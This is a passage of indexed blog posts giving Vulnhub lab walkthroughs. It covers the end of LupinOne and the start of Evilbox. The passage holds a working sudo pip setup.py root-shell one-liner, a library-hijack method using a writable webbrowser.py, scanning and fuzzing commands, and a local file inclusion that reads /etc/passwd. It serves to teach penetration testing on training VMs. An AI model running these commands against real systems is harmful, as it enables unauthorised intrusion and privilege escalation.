\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @\u0026\u0026\u0026 , \u0026%(( \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 #\u0026\u0026\u0026 , \u0026#/* \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( (\u0026\u0026\u0026 , %@ \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 /*\u0026/ , \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026* \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 , \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026, \u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( \u0026,@ ,.\u0026 # #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( \u0026\u0026\u0026.\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *\u0026 \u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026(\u0026 *\u0026 \u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *\u0026 * \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@. \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @ \u0026 *\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@ \u0026\u0026\u0026\u0026\u0026/ \u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *% . \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026( #\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026. % \u0026 *\u0026 * \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 /* @%\u0026%\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026, @ \u0026 *\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @\u0026\u0026\u0026 \u0026 \u0026 *\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026 / /\u0026\u0026\u0026\u0026 \u0026\u0026\u0026 \u0026 @ */(, \u0026\u0026 \u0026 / \u0026. * \u0026 \u0026 \u0026\u0026\u0026 # \u0026\u0026\u0026\u0026\u0026\u0026 @ \u0026 \u0026. * .% \u0026 \u0026\u0026\u0026%\u0026 \u0026 @\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. %@\u0026\u0026* ( @, / \u0026 % .\u0026\u0026\u0026\u0026 \u0026@ @ \u0026/ @ \u0026 * \u0026 @ \u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026. , \u0026 \u0026 * \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026\u0026( \u0026 \u0026 \u0026 , \u0026 % \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( .\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 \u0026 , \u0026 .. \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026* \u0026 \u0026 \u0026 \u0026 , #\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026. % \u0026 , \u0026 , \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. \u0026\u0026\u0026\u0026 @ \u0026* , \u0026 ,, \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026@ , \u0026 \u0026 #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026@ \u0026. \u0026\u0026 , \u0026\u0026 /# /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026# \u0026\u0026\u0026# \u0026# #\u0026 , \u0026\u0026 \u0026( .\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 \u0026\u0026 / ,\u0026\u0026( \u0026\u0026% *\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026% .\u0026\u0026\u0026 /\u0026\u0026, , \u0026\u0026\u0026\u0026\u0026/... .#\u0026\u0026\u0026\u0026# 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box} See you on the next heist. Thsi way is easy, but maybe cause the kernel crash, or root can not login. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:5:1","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"2. Second method - LinPEAS Download and execute LinPEAS.sh: And we can see some exploit suggester: And we can see user icex64’s privilege info: And we found some writable files: As we know, the file /home/arsene/heist.py content like follow: icex64@LupinOne:~$ cat /home/arsene/heist.py import webbrowser print (\"Its not yet ready to get in action\") webbrowser.open(\"https://empirecybersecurity.co.mz\") and the file webbrowser.py is writable. So, we can change the /usr/lib/python3.9/webbrowser.py file to achive the root. Modify the file /usr/lib/python3.9/webbrowser.py as follows, add some payload: And then execute the heist.py file: icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py arsene@LupinOne:/home/icex64$ id uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) arsene@LupinOne:/home/icex64$ cd /home/arsene/ arsene@LupinOne:~$ ls heist.py note.txt arsene@LupinOne:~$ cat note.txt Hi my friend Icex64, Can you please help check if my code is secure to run, I need to use for my next heist. I dont want to anyone else get inside it, because it can compromise my account and find my secret file. Only you have access to my program, because I know that your account is secure. See you on the other side. Arsene Lupin. Well, how we can get root? Condiser the sudo -l: arsene@LupinOne:~$ sudo -l Matching Defaults entries for arsene on LupinOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User arsene may run the following commands on LupinOne: (root) NOPASSWD: /usr/bin/pip The pip application has root privilege, so we can use it: arsene@LupinOne:~$ TF=$(mktemp -d) echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh \u003c$(tty) \u003e$(tty) 2\u003e$(tty)')\" \u003e $TF/setup.py sudo pip install $TF Processing /tmp/tmp.e43H2KlJDL # id uid=0(root) gid=0(root) groups=0(root) # ls /root root.txt # cat /root/root.txt *,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , .\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 , \u0026\u0026\u0026\u0026\u0026\u0026* @\u0026\u0026\u0026\u0026\u0026\u0026 , *\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026 , \u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026. , \u0026\u0026\u0026\u0026 ./#%@@\u0026#, \u0026\u0026\u0026\u0026* , \u0026%\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026**,**/\u0026\u0026(\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026 , \u0026@(\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026.....,\u0026\u0026*\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026 , .\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026.\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026%\u0026 , @\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @\u0026\u0026\u0026 , \u0026%(( \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 #\u0026\u0026\u0026 , \u0026#/* \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( (\u0026\u0026\u0026 , %@ \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 /*\u0026/ , \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026* \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 , \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026, \u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( \u0026,@ ,.\u0026 # #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( \u0026\u0026\u0026.\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *\u0026 \u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026(\u0026 *\u0026 \u0026 ,\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *\u0026 * \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@. \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @ \u0026 *\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@ \u0026\u0026\u0026\u0026\u0026/ \u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 *% . \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026( #\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026. % \u0026 *\u0026 * \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 /* @%\u0026%\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026, @ \u0026 *\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 @\u0026\u0026\u0026 \u0026 \u0026 *\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026 / /\u0026\u0026\u0026\u0026 \u0026\u0026\u0026 \u0026 @ */(, \u0026\u0026 \u0026 / \u0026. * \u0026 \u0026 \u0026\u0026\u0026 # \u0026\u0026\u0026\u0026\u0026\u0026 @ \u0026 \u0026. * .% \u0026 \u0026\u0026\u0026%\u0026 \u0026 @\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. %@\u0026\u0026* ( @, / \u0026 % .\u0026\u0026\u0026\u0026 \u0026@ @ \u0026/ @ \u0026 * \u0026 @ \u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026. , \u0026 \u0026 * \u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026\u0026\u0026( \u0026 \u0026 \u0026 , \u0026 % \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( .\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026 \u0026 , \u0026 .. \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026* \u0026 \u0026 \u0026 \u0026 , #\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026. % \u0026 , \u0026 , \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. \u0026\u0026\u0026\u0026 @ \u0026* , \u0026 ,, \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026. /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026 \u0026@ , \u0026 \u0026 #\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026@ \u0026. \u0026\u0026 , \u0026\u0026 /# /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026# \u0026\u0026\u0026# \u0026# #\u0026 , \u0026\u0026 \u0026( .\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 \u0026\u0026 / ,\u0026\u0026( \u0026\u0026% *\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026% .\u0026\u0026\u0026 /\u0026\u0026, , \u0026\u0026\u0026\u0026\u0026/... .#\u0026\u0026\u0026\u0026# 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box} See you on the next heist. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:5:2","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"Notes","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:6:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"Vulnhub Training -- Evilbox","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"Vulnhub Training Waklthrough – Evilbox。 ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:0:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"Knowledge gobuster – web directory scanner wfuzz – parameter fuzzing tool php filter – get the source code of php file LFI – local file include john – hash crack chang /etc/paswd file to change root’s passwd ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:1:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"1. Environment Setup OVA download link: https://www[.]vulnhub.com/entry/evilbox-one,736/ If use VMware to setup the environment, need to set up the network, change the network interface enpns3 to ens33, and then restrat the network. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:2:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:3:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"1. IP Address arp-scan scanner: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.147 00:0c:29:8f:f7:63 VMware, Inc. 172.16.86.254 00:50:56:f7:8b:40 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.403 seconds (106.53 hosts/sec). 4 responded ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:3:1","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"2. Port Info nmap scanner: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nmap -T4 -A -Pn 172.16.86.147 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 03:25 EST Nmap scan report for 172.16.86.147 Host is up (0.0025s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA) | 256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA) |_ 256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds Enable service: port servie 22 ssh 80 http web The ssh service need username and password. The web service is a default page of Apache2: ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:3:2","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"3. Web Directory Find the other web url: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ dirb http://172.16.86.147 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Fri Nov 10 03:54:10 2023 URL_BASE: http://172.16.86.147/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://172.16.86.147/ ---- + http://172.16.86.147/index.html (CODE:200|SIZE:10701) + http://172.16.86.147/robots.txt (CODE:200|SIZE:12) ==\u003e DIRECTORY: http://172.16.86.147/secret/ + http://172.16.86.147/server-status (CODE:403|SIZE:278) ---- Entering directory: http://172.16.86.147/secret/ ---- + http://172.16.86.147/secret/index.html (CODE:200|SIZE:4) ----------------- END_TIME: Fri Nov 10 03:54:25 2023 DOWNLOADED: 9224 - FOUND: 4 We found a /secret directory and robots.txt file and so on, Access the robots.txt: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.147/robots.txt Hello H4x0r Nothing. And access the secret directory: ──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ curl http://172.16.86.147/secret/ Nothing rertun, Keep find: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ gobuster dir -u http://172.16.86.147:80/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.147:80/secret/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /.html (Status: 403) [Size: 278] /index.html (Status: 200) [Size: 4] /evil.php (Status: 200) [Size: 0] /.php (Status: 403) [Size: 278] /.html (Status: 403) [Size: 278] Progress: 882240 / 882244 (100.00%) =============================================================== Finished =============================================================== Well, found a evil.php file, access it: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ curl http://172.16.86.147/secret/evil.php Nothing return. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:3:3","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"3. Exploit Consider fuzz evil.php’s parameters: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ ffuf -ic -c -r -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd -mr \"root:x\" /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Regexp: root:x ________________________________________________ command [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 2ms] :: Progress: [20476/20476] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:03] :: Errors: 0 :: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz] └─$ ./wfuzz -c -u 'http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/big.txt --hh 0 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd Total requests: 20476 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000004959: 200 26 L 38 W 1398 Ch \"command\" Total time: 16.27521 Processed Requests: 20476 Filtered Requests: 20475 Requests/sec.: 1258.109 The parameter is command, we can access the evil.php with it: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ curl http://172.16.86.147/secret/evil.php?command=/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin We can get a user named mowree , but we still have no password. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:4:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"1. vire php source We can get the php version info through the command: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ curl http://172.16.86.147/secret/evil.php?command=php --version curl 8.3.0 (x86_64-pc-linux-gnu) libcurl/8.3.0 OpenSSL/3.0.11 zlib/1.2.13 brotli/1.0.9 zstd/1.5.5 libidn2/2.3.4 libpsl/0.21.2 (+libidn2/2.3.4) libssh2/1.11.0 nghttp2/1.58.0 librtmp/2.3 OpenLDAP/2.5.13 Release-Date: 2023-09-13 Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd So, we can consider to view the php page source through the php filter: 